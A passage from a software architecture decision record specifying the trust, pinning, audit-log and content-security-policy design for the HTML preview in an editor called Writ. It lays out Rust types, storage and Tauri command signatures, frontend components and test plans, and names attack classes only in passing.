audit.** Per the project quality bar, in-repo specialist work is
the model. A third-party pen-test is a one-time finding; the
in-repo suite gates merge on every PR forever. The threat model
document (`docs/security/html-preview.md`) is the human-readable
companion to the suite; together they constitute the audit.

**Why fifteen fixtures and not five.** Each fixture covers a
distinct attack class with distinct CSP directives. Collapsing
them into fewer files would conflate failure modes — a fixture
that mixes `<img src>` exfil with `meta refresh` exfil makes the
failure ambiguous. One fixture per class makes the failure point
to the class, which makes the fix targeted.

**Why a 30-second hard cap per fixture and 5-second target.**
Five seconds is enough wall-clock to spin a webview, render a
document, and observe a CSP-violation event. A fixture that
exceeds five seconds is either spinning on a real bug (good — it
will fail) or is over-engineered (refactor). The 30-second hard
cap from the test harness ensures CI never hangs.

## Consequences

### `writ-core`

New module `preview::trust` (alongside the existing
`preview` module from ADR-009). Pure-domain types, no Tauri, no
SQLite, no async. All types `Serialize + Deserialize` for IPC.

```rust
pub enum PreviewPolicy {
    Safe,
    AllowScripts,
    AllowNetwork,
    AllowBoth,
}

pub enum PolicyPersistence { Session, Pinned }

pub enum PinScope { File, WorkspaceExtension, WorkspaceGlobal }

pub enum PolicySource {
    Default,
    Pin { pin_id: i64, scope: PinScope },
    Session { granted_at: SystemTime },
}

pub struct EffectivePolicy {
    pub policy: PreviewPolicy,
    pub persistence: PolicyPersistence,
    pub source: PolicySource,
}

pub struct PinRecord {
    pub id: i64,
    pub scope: PinScope,
    pub workspace_id: Option<WorkspaceId>,
    pub path: Option<PathBuf>,
    pub extension: Option<String>,
    pub policy: PreviewPolicy,
    pub content_hash: Option<[u8; 32]>,
    pub created_at: SystemTime,
    pub last_used_at: Option<SystemTime>,
    pub revoked_at: Option<SystemTime>,
    pub revoke_reason: Option<RevokeReason>,
}

pub enum RevokeReason {
    User,
    Bulk,
    HashReconfirm,
    Orphan,
    SessionExpired,
}

pub enum AuditEvent {
    Granted { pin_id: i64, policy: PreviewPolicy },
    Modified { pin_id: i64, before: PreviewPolicy, after: PreviewPolicy },
    Revoked { pin_id: i64, before: PreviewPolicy, reason: RevokeReason },
    HashMismatchReconfirmed { pin_id: i64 },
    HashMismatchRevoked { pin_id: i64, before: PreviewPolicy },
    BulkRevoked { pin_ids: Vec<i64>, scope: BulkRevokeScope },
    SessionExpired { buffer_path: Option<PathBuf>, policy: PreviewPolicy },
    AuditLogTruncated { evicted: usize },
    AuditLogWriteFailed { reason: String },
}

pub enum BulkRevokeScope {
    Workspace(WorkspaceId),
    Global,
}

pub enum TrustError {
    PinNotFound { id: i64 },
    WorkspaceRequired,
    InvalidPolicyTransition { from: PreviewPolicy, to: PreviewPolicy },
    HashComputeFailed { path: PathBuf, reason: String },
    Internal { reason: String },
}
```

`WorkspaceId` is imported from ADR-010's `writ_core::workspace`
module rather than redeclared here; the trust crate depends on the
workspace types being defined in the same crate boundary.

Unit tests in `writ-core`: `PreviewPolicy` round-trip serde; pin-
scope precedence logic (a pure function that takes a list of
`PinRecord` and the current `(buffer_path, workspace_id: Option<WorkspaceId>)`
and returns the matching pin, if any); `AuditEvent` serde; exhaustive
match coverage for `PolicySource`, `RevokeReason`,
`BulkRevokeScope`, `TrustError`.

### `writ-storage`

New tables `preview_pins` and `preview_trust_audit` per the schema
above. New migration `011_preview_trust.sql`. New repository
module `crates/writ-storage/src/preview_pins.rs` exposing:

```rust
pub fn list_pins(&self, filter: PinFilter) -> Result<Vec<PinRecord>, StorageError>;
pub fn lookup_pin(&self, buffer_path: &Path, workspace_id: Option<&WorkspaceId>) -> Result<Option<PinRecord>, StorageError>;
pub fn create_pin(&self, draft: NewPin) -> Result<PinRecord, StorageError>;
pub fn modify_pin(&self, id: i64, new_policy: PreviewPolicy) -> Result<PinRecord, StorageError>;
pub fn revoke_pin(&self, id: i64, reason: RevokeReason) -> Result<(), StorageError>;
pub fn bulk_revoke(&self, scope: BulkRevokeScope) -> Result<usize, StorageError>;
pub fn update_last_used(&self, id: i64) -> Result<(), StorageError>;
pub fn update_content_hash(&self, id: i64, hash: [u8; 32]) -> Result<(), StorageError>;
```

And a parallel `crates/writ-storage/src/preview_audit.rs`:

```rust
pub fn append_audit(&self, event: AuditEvent) -> Result<(), StorageError>;
pub fn query_audit(&self, filter: AuditFilter) -> Result<Vec<AuditRow>, StorageError>;
pub fn export_audit_csv(&self, filter: AuditFilter, writer: &mut dyn Write) -> Result<(), StorageError>;
pub fn evict_to_cap(&self, cap: usize) -> Result<usize, StorageError>;
```

Tests: insert/lookup/revoke/bulk-revoke round-trips; orphan-pin
behavior on workspace deletion; index-hit verification (assert
that `lookup_pin` uses the `idx_preview_pins_path` index via
`EXPLAIN QUERY PLAN`); FIFO eviction in `evict_to_cap`; CSV export
escapes quotes and newlines correctly.

`writ-storage` adds no new dependencies. SHA-256 lives in
`writ-storage::hash` using the existing `sha2` crate (already in
the workspace).

### `writ-plugin`

**Untouched.** The trust model is host-side; plugins do not yet
exist as runtime artifacts (ADR-006 ships built-in transforms
only) and trust does not extend to plugin authors in v1.

### `src-tauri`

New `preview/security/` module:

- `csp.rs` — `CspScope` enum (`Chrome | Document`); `build_csp(scope, policy) -> String`;
  per-cell builders (eight functions or one match with eight arms);
  unit tests asserting the documented bytes per cell.
- `protocol_disposition.rs` — request-disposition logic for the
  `writ-preview://` protocol handler. Decides `Allowed | Blocked |
  Refused` per request. The test hook (debug builds only) records
  every disposition into a `thread_local` `Vec<RequestRecord>`.
- `pin_lookup.rs` — wraps `writ-storage::preview_pins` for the
  IPC layer. Caches the active-window pin set in memory for the
  10ms lookup budget.
- `hash.rs` — SHA-256 over in-memory buffer bytes. Streaming
  variant for buffers above the 1 MB threshold (defers via the
  `manual_render_trigger`).
- `policy_resolver.rs` — composes the lookup precedence
  (File → WorkspaceExtension → WorkspaceGlobal → Session →
  Default). Returns an `EffectivePolicy`.

New `commands/preview_trust.rs`:

```rust
#[tauri::command] fn list_pins(filter: PinFilter) -> Result<Vec<PinDto>, String>;
#[tauri::command] fn create_pin(draft: NewPinDto) -> Result<PinDto, String>;
#[tauri::command] fn modify_pin(id: i64, policy: PreviewPolicyDto) -> Result<PinDto, String>;
#[tauri::command] fn revoke_pin(id: i64) -> Result<(), String>;
#[tauri::command] fn bulk_revoke(scope: BulkRevokeScopeDto) -> Result<usize, String>;
#[tauri::command] fn list_audit_log(filter: AuditFilterDto) -> Result<Vec<AuditRowDto>, String>;
#[tauri::command] fn export_audit_csv(filter: AuditFilterDto) -> Result<String, String>;
#[tauri::command] fn confirm_pin_dialog_state(buffer_id: BufferId, window_id: WindowId) -> Result<DialogStateDto, String>;
#[tauri::command] fn apply_session_policy(buffer_id: BufferId, window_id: WindowId, policy: PreviewPolicyDto) -> Result<(), String>;
```

`AppState` gains:

- `pin_cache: Arc<RwLock<PinCache>>` — the in-memory pin set
  reloaded on every pin write.
- `audit_writer: Arc<Mutex<AuditWriter>>` — serializes audit
  writes via the existing connection mutex.
- `policy_resolver: Arc<PolicyResolver>` — pure-domain resolver,
  no I/O.

The Tauri protocol handler in `src-tauri/src/preview/handler.rs`
(introduced in ADR-009's implementation) is extended here to:

1. Look up the effective policy for the requested buffer via
   `policy_resolver`.
2. Apply the per-webview CSP via `webview.set_csp(build_csp(scope, policy))`
   on every request that crosses a scope boundary (or once at
   webview creation, depending on Tauri's API surface — to be
   confirmed in the implementation PR; the ADR commits the
   policy decision, not the API call site).
3. Record dispositions via the test hook in debug builds.
4. Refuse cross-scope traversals; return error responses (not
   404s) on `Refused`.

`tauri.conf.json` already declares the main webview CSP. This
ADR adds no changes to the main webview's CSP; the preview
webview's CSP is set programmatically per-webview at create time,
not in `tauri.conf.json`. The CSP strings live in source
(`csp.rs`) and are constant-folded at compile time.

### Frontend

New components under `src/components/Preview/`:

- `PolicyChip.tsx` — the discreet status affordance in the
  preview pane's bottom-right (the same chip declared in
  ADR-009's `PreviewStatusChip`, now wiring the trust state).
  Click opens the trust dialog. Visual states:
  - `SAFE`: muted neutral chip, no icon.
  - `ALLOW_SCRIPTS`: amber dot + `scripts`.
  - `ALLOW_NETWORK`: amber dot + `network`.
  - `ALLOW_BOTH`: amber dot + `scripts + network`.
  - Pinned variant: small pin glyph next to the chip's label.
  - Session-only variant: no pin glyph.
  - Hash-mismatch variant: red dot + `hash mismatch` (read-only
    chip; the actual action is in the banner).
- `TrustDialog.tsx` — the confirm dialog described in the
  pinning UX flow section. Wraps the existing modal component
  pattern; follows ADR-009's only-modal precedent (the
  preview-export modal). Risk-acknowledgment checkbox enabled
  only for workspace-global pins; cancel-on-Esc; click-outside
  dismisses.
- `HashMismatchBanner.tsx` — non-modal banner inside the
  preview pane. Two buttons: `Re-confirm`, `Revoke`. Dismissable
  for the current preview session via a small `×`; reappears on
  next preview open.

New components under `src/components/Settings/TrustedFiles/`:

- `TrustDashboard.tsx` — the main dashboard. Tabs:
  `Pins | Audit log`. Default tab: `Pins`.
- `TrustDashboard/PinList.tsx` — sectioned list grouped by
  workspace + Outside-workspace + Orphaned. Virtualized for
  10_000+ rows.
- `TrustDashboard/PinRow.tsx` — single pin row.
- `TrustDashboard/BulkRevokeConfirm.tsx` — confirm dialog with
  the count, e.g. "Revoke 17 pins in workspace W?".
- `AuditLog.tsx` — audit log tab. Filter bar (event type, date
  range), virtualized list, CSV export button.

New stores:

- `src/stores/global/trust.ts` — pin registry. App-global
  because pin state is shared across all windows. Loaded at
  startup from `list_pins`. Updated on every IPC mutation.
  Singleton justification comment per CLAUDE.md.
- `src/stores/window/policy.ts` — per-window session policy
  state. Lives in the per-window `<WindowProvider>` from
  ADR-009 E3. Holds `Map<BufferId, PreviewPolicy>` for buffers
  with active session policies in this window. Cleared on
  window close (and that clearing triggers the
  `session_expired` audit events for each entry).

New service bindings in `src/services/tauri.ts`:

- `listPins(filter)`
- `createPin(draft)`
- `modifyPin(id, policy)`
- `revokePin(id)`
- `bulkRevoke(scope)`
- `listAuditLog(filter)`
- `exportAuditCsv(filter)`
- `confirmPinDialogState(bufferId, windowId)`
- `applySessionPolicy(bufferId, windowId, policy)`

All strictly typed against the Rust command signatures. No new
direct `@tauri-apps/api` imports anywhere else.

### Styling

- `src/styles/trust.css` — chrome styles for the trust dialog,
  the policy chip, the dashboard rows, the audit log rows. Lives
  in the main app webview, inherits the existing theme tokens.
  No `font-family` literals (per ADR-008's regression test).
- `src/styles/trust-banner.css` — styles for the
  `HashMismatchBanner` rendered inside the preview pane. Bundled
  into the preview chrome and served via the chrome scope; the
  banner is a chrome-scoped overlay rendered above the document
  scope's iframe-substitute (the inline document area). The
  banner has its own DOM in the chrome layer; the document does
  not see it.

### Configuration

`WritConfig` gains a `[preview.trust]` section:

```toml
[preview.trust]
audit_cap                   = 10000     # FIFO eviction beyond this
ask_before_workspace_global = true      # require risk-ack checkbox
default_persistence         = "session" # 'session' | 'pinned'
```

Settings UI gains a `Trust` subsection under `Preview`. The
existing settings surface gains entries for these three keys plus
the link to the Trusted Files dashboard.

### Testing

- **Unit (writ-core).** `PreviewPolicy` round-trip; pin-scope
  precedence (eight cases covering every position in the
  precedence list); `AuditEvent` serde; `BulkRevokeScope`
  expansion to pin IDs (pure function); exhaustive `match`
  coverage tests for every enum.
- **Unit (writ-storage).** Pin CRUD; lookup precedence in SQL;
  orphan behavior on workspace deletion; FIFO audit eviction
  honoring the cap; CSV export quoting and newline escaping;
  index hit assertions via `EXPLAIN QUERY PLAN`.
- **Unit (src-tauri csp.rs).** Each of the eight cells returns
  the documented byte sequence. The CSP-builder is a pure
  function; tests are byte-equality assertions.
- **Integration (src-tauri).** Every IPC command round-trips
  correctly. The pin cache invalidates on writes. The audit log
  is appended on every state change. The protocol handler
  records every request to the test hook in debug builds; the
  hook is absent in release builds (test asserts the symbol is
  gone via `#[cfg(debug_assertions)]` introspection where
  possible).
- **Verification suite.** The fifteen fixtures above, each as a
  Rust integration test, each running on the mac/Linux/Windows
  CI matrix per ADR-009. Sixty named assertion points across
  four policy states.
- **cargo-fuzz.** Three targets: `preview_url_parser`,
  `workspace_url_parser`, `csp_builder_smoke`. 60s quick-fuzz
  per PR, 30min nightly. Corpus committed under `fuzz/corpus/`.
- **Frontend.** `TrustDialog` renders the conditional sections
  correctly per state (session vs. pinned; workspace present
  vs. not; risk-ack toggle behavior). `PinList` virtualizes
  correctly at 10_000 rows. `AuditLog` filter correctly narrows
  results. `HashMismatchBanner` appears on hash mismatch and
  disappears on re-confirm.
- **Performance.** Per the budget table. Asserted in CI as
  failing gates.

### Workspace and crate dependency impact

- `writ-core` gains the `preview::trust` module. No new
  external crate dependencies; `sha2` is referenced only by
  `writ-storage` (the hash is computed there, the `[u8; 32]`
  flows through `writ-core` as a plain byte array).
- `writ-storage` gains migration `011_preview_trust.sql` and
  the two repository modules. No new crate dependencies.
- `writ-plugin` untouched.
- `src-tauri` gains the `preview/security/` module,
  `commands/preview_trust.rs`, and updates to the existing
  `preview/` module from ADR-009 to wire the policy resolver
  into the protocol handler. No new crate dependencies.

ADR-005's crate-boundary law is upheld: no Tauri in core, no
Tauri in storage, no Tauri in plugin; only `src-tauri` imports
Tauri. ADR-006's loader-agnostic registry shape is upheld: the
trust model is independent of the renderer registry; a future
external renderer's trust posture is decided by the policy
state that applies to the buffer being rendered, not by a
renderer-specific permission.

## Open questions deferred to follow-up ADRs

- **External trust providers (signing keys for workspace global
  pins).** A future scenario where a team shares a workspace and
  wants to share trust state without sharing the SQLite database
  (e.g., a signed `.writ/pins.toml` checked into Git). Requires
  a signing-key story, a public-key distribution mechanism, and
  a verification layer on import. Out of scope for v1; the on-
  device pin database is the authority. Reserved.
- **Workspace trust attestation (signed `.writ/pins.toml`).**
  Adjacent to the above: a workspace maintainer signs the
  workspace's pin export with a private key; collaborators
  verify against a configured public key on import. Same
  blockers as the previous bullet. Reserved.
- **Per-renderer trust inheritance.** Does a Mermaid renderer
  need its own trust dimension separate from the document's
  trust? **Answer: no in v1.** The Mermaid runtime is host code
  served from the chrome scope under the chrome CSP; the user's
  document does not affect the Mermaid runtime's permissions.
  The user does not opt into Mermaid; if they preview an HTML
  document that uses Mermaid, the chrome-scoped runtime renders
  it under the chrome CSP regardless of the document's trust
  state. Same for KaTeX and PDF.js. If a future renderer
  requires network egress as a normal mode (it should not), that
  is a separate ADR that revisits this answer.
- **Cross-window pin sync.** v1 reloads the pin cache on every
  pin write in the main window. A future feature where two
  detached preview windows simultaneously edit pin state is not
  supported; the detached preview's policy chip is read-only
  per the lifecycle section above, which sidesteps the question.
- **Pin expiration / time-to-live.** v1 pins do not expire; they
  are revoked manually or by hash mismatch + revoke flow. A
  future opt-in `[preview.trust] pin_ttl_days = N` could expire
  pins automatically. Reserved.
- **Read-only enforcement of the audit log on disk.** The
  `preview_trust_audit` table lives in the same SQLite database
  as everything else; a malicious local actor with filesystem
  access can drop the table. v1 does not defend against local-
  filesystem attackers; the audit log is for the user's own
  accountability, not as a forensic record against an actor
  with the user's privileges. Documented limitation.
- **Trust-scoped notifications.** A future UX where pinning is
  surfaced via a small post-confirm toast ("`*.html` in workspace
  W now trusted for scripts"). v1 ships the dashboard and the
  audit log; the toast is a polish item. Reserved.
- **Domain-scoped pins for ALLOW_NETWORK.** Today `ALLOW_NETWORK`
  is "any HTTPS host." A future refinement could constrain to a
  pin-specified host allowlist, e.g., "this document may fetch
  from `fonts.googleapis.com` and nowhere else." The pin schema
  reserves a nullable `connect_src_allowlist` column for this in
  a future migration; v1 does not populate it. Reserved.

## Minor decisions landing in implementation PRs (not deferred — recorded so the PR author does not re-derive)

- **Hash is computed over in-memory buffer bytes, not on-disk
  bytes.** The renderer renders the in-memory text; the hash
  matches the rendered content. A trusted-then-edited buffer
  shows the hash-mismatch banner until re-confirmed.
  Implementation PR references this decision in the hash module
  rather than asking why.
- **`X-Content-Type-Options: nosniff` is set on every protocol-
  handler response.** The `content_sniff_confusion.rs` fixture
  depends on this. Implementation PR's protocol handler sets
  the header unconditionally; absence of the header in any
  response is a verification-suite failure.
- **`'unsafe-inline'` and `'unsafe-eval'` are scoped to the
  document scope only.** The chrome scope never grants either.
  Implementation PR's `csp.rs` enforces this at compile time by
  having the chrome-scope cell return a string that does not
  contain those substrings; a unit test asserts the substring
  absence.
- **HTTP (plaintext) is always blocked, in every policy state.**
  `ALLOW_NETWORK` is `https:` only; `ALLOW_BOTH` is `https:`
  only; `connect-src http:` never appears in any cell. The
  implementation does not provide a configuration toggle to
  permit HTTP; users who need HTTP for development localhost
  use the source view instead. (Localhost HTTP development is a
  rare-enough case that we are not opening a hole for it; an
  open question is reserved if user demand emerges.)
- **The pin-confirm dialog is the only modal in this ADR.** The
  hash-mismatch surface is a non-modal banner; the bulk-revoke
  confirm is a smaller in-dashboard modal that follows the
  existing confirm-dialog component pattern. ADR-009 already
  added one modal (preview export); this ADR adds one more
  (trust confirm) and reuses the existing confirm pattern for
  bulk revoke.
- **The risk-acknowledgment checkbox in the workspace-global
  case applies to all non-SAFE policies under `WorkspaceGlobal`
  scope, not only to `ALLOW_BOTH`.** A user pinning
  `ALLOW_SCRIPTS` workspace-globally is granting script
  execution to every file in the workspace; the acknowledgment
  is required. Implementation PR does not narrow this to
  `ALLOW_BOTH` only.
- **CSV export of the audit log is RFC 4180 conformant.** Commas
  and newlines inside fields are quoted; literal quotes are
  doubled. The implementation uses Rust's `csv` crate (already
  in the workspace via `writ-storage`'s search index export) or
  hand-rolled escaping. The fixture in
  `crates/writ-storage/tests/audit_csv.rs` asserts conformance.
- **Memory ceiling for the pin cache.** The in-memory pin cache
  is bounded by the SQLite table size (capped by the pin count
  the user has created; there is no automatic eviction beyond
  user revocation). A user with 10_000 pins occupies ~5 MB of
  memory for the cache, which is acceptable. No eviction policy
  is needed in v1.
- **The dashboard does not surface session policies.** Session
  policies live in per-window stores and die at window close.
  They are not pins. The dashboard is the pin dashboard; the
  preview pane's policy chip is where session state is visible.
  This separation is deliberate — the dashboard's job is
  managing persistent trust grants, not the moment-to-moment
  state of every open preview.
- **Workspace-deletion cascade does NOT cascade to pins.** Per
  the schema `ON DELETE SET NULL`. Pins outlive workspaces and
  surface under "Orphaned" with a one-click revoke. This
  matches the user-intent driver: a workspace being deleted is
  a UI gesture, not a security-state change; the user should
  consciously revoke trust if that is what they want.
- **`workspace_id` resolution for buffers opened outside a
  workspace.** When a buffer is opened from `/tmp/foo.html`
  with no active workspace, `workspace_id` is `None`. The
  `File` pin's `workspace_id` is also `None` in that case. If
  the same file is later opened while inside a workspace
  containing it, the `workspace_id` on the File pin remains
  `None` (it was granted outside any workspace) and the pin
  still applies because File-scope is path-keyed, not
  workspace-keyed. This rule is recorded so the implementation
  PR does not invent its own answer about pin-workspace
  re-binding.
